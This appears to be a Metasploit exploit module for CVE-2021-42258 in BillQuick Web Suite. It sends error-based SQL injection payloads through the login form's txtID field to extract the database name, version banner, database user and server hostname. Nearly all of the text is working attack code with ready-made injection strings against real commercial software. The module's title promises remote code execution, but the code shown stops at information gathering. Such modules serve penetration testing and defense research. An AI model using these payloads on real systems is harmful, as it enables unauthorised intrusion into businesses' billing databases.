##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BillQuick Web Suite txtID SQLi to RCE',
        'Description' => %q{
          This exploit module illustrates how a vulnerability could be exploited
          in a webapp.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Caleb Stewart' # original PoC, analysis
        ],
        'References' => [
          [ 'URL', 'https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware'],
          [ 'CVE', '2021-42258']
        ],
        'Platform' => ['windows'],
        'Privileged' => false,
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2021-10-22',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )
    # set the default port, and a URI that a user can set if the app isn't installed to the root
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of BillQuick Web Suite', '/ws2020/']),
        OptInt.new('TIMEOUT', [ true, 'The timeout for HTTP requests. Responses are slow.', 15])
      ], self.class
    )
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'default.aspx'),
        'method' => 'GET'
      }, datastore['TIMEOUT'])
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

      # here we're looking through html for the version string, similar to:
      # Version 1.2
      %r{Version: (?<version>\d{1,2}\.\d{1,2}\.\d{1,2})\.\d{1,2}</span>} =~ res.body

      if version && Rex::Version.new(version) <= Rex::Version.new('22.0.9.1')
        return CheckCode::Appears("Version Detected: #{version}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    CheckCode::Safe("Unexploitable Version: #{version}")
  end

  def error_info(body)
    /BQEShowModalAlert\('Information','(?<error>[^']+)/ =~ body
    error
  end

  def inject(content, state, generator, validation)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'default.aspx'),
      'method' => 'POST',
      'vars_post' => {
        '__VIEWSTATE' => state,
        '__VIEWSTATEGENERATOR' => generator,
        '__EVENTVALIDATION' => validation,
        '__EVENTTARGET' => 'cmdOK',
        '__EVENTARGUMENT' => '',
        'txtID' => content,
        'txtPW' => '',
        'hdnClientDPI' => '96'
      }
    }, datastore['TIMEOUT'])

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
    res.body
  end

  def exploit
    vprint_status('Getting Variables')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'default.aspx'),
      'method' => 'GET'
    }, datastore['TIMEOUT'])

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

    /id="__VIEWSTATE" value="(?<viewstate>[^"]+)/ =~ res.body
    /id="__VIEWSTATEGENERATOR" value="(?<viewstategenerator>[^"]+)/ =~ res.body
    /id="__EVENTVALIDATION" value="(?<eventvalidation>[^"]+)/ =~ res.body
    unless viewstate && viewstategenerator && eventvalidation
      fail_with(Failure::UnexpectedReply, 'Unable to find viewstate, viewstategenerator, and eventvalidation values.')
    end
    vprint_status("VIEWSTATE: #{viewstate}")
    vprint_status("VIEWSTATEGENERATOR: #{viewstategenerator}")
    vprint_status("EVENTVALIDATION: #{eventvalidation}")

    # all inject strings taken from sqlmap runs, using error page method
    res = inject("'+(SELECT CHAR(80)+CHAR(66)+CHAR(120)+CHAR(110) WHERE 6678=6678 AND CHARINDEX(CHAR(49)+CHAR(53)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)>0)+'", viewstate, viewstategenerator, eventvalidation)
    /, table \\u0027(?<table>.+?)\\u0027/ =~ error_info(res)
    print_good("Current Database: #{table.split('.').first}")

    res = inject("'+(SELECT CHAR(115)+CHAR(102)+CHAR(71)+CHAR(76) WHERE 3944=3944 AND 1325 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(113)+(SELECT SUBSTRING((ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(106)+CHAR(113))))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<banner>.+?)\\u0027/ =~ error_info(res)
    banner.slice!('qqqqq')
    banner.slice!('qxqjq')
    print_good("Banner: #{banner}")

    res = inject("'+(SELECT CHAR(119)+CHAR(70)+CHAR(107)+CHAR(100) WHERE 5430=5430 AND 8603 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(113)+(SELECT SUBSTRING((ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(106)+CHAR(113))))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<user>.+?)\\u0027/ =~ error_info(res)
    user.slice!('qqqqq')
    user.slice!('qxqjq')
    print_good("DB User: #{user}")

    res = inject("'+(SELECT CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113) WHERE 7201=7201 AND 7555 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(113)+(SUBSTRING((ISNULL(CAST(@@SERVERNAME AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(106)+CHAR(113))))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<hostname>.+?)\\u0027/ =~ error_info(res)
    hostname.slice!('qqqqq')
    hostname.slice!('qxqjq')
    print_good("Hostname: #{hostname}")
    return
  end
end
